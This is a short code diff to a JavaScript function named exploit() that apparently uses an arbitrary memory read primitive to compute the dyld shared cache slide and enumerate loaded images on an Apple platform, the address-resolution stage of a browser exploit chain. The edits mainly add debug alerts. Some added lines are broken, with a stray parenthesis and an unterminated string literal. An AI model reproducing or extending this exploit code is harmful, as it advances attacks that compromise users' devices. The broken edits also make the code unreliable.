@@ -643,7 +643,9 @@ function exploit(){
             fail("base_seg");
         }
         var cache_slide = Sub(hdr, base_seg.addr);
-        base_seg.addr = Add(base_seg.addr, cache_slide)
+        alert("cache slide" + cache_slide);
+        //base_seg.addr = Add(base_seg.addr, cache_slide
+)
         for(var i = 0; i < nsegs; ++i)
         {
             segs[i].addr = Add(segs[i].addr, cache_slide);
@@ -699,7 +701,7 @@ function exploit(){
         
             var m = i * 0x20;
             alert(memory.u32(Add(Add(imgs,m),0x18)))
-            var straddr = off2addr(base_seg, memory.u32(Add(Add(imgs,m),0x18)));
+            var straddr = off2addr(segs, memory.u32(Add(Add(imgs,m),0x18)));
             var fn = function(i)
             {
                 var g = memory.copyfrom(Add(straddr, i),0,50);
@@ -711,7 +713,7 @@ function exploit(){
             };
             alert("dyld image #"+i+":"+ab2str(fn()))
             var base = Add(memory.read_i64(Add(imgs,m),0), cache_slide);
-            alert("base" + base);
+            alert("base" + base + "vs you );
             //alert(opcode_libs.some())
             if(opcode_libs.some(lib => strcmp(fn, lib)))
             {
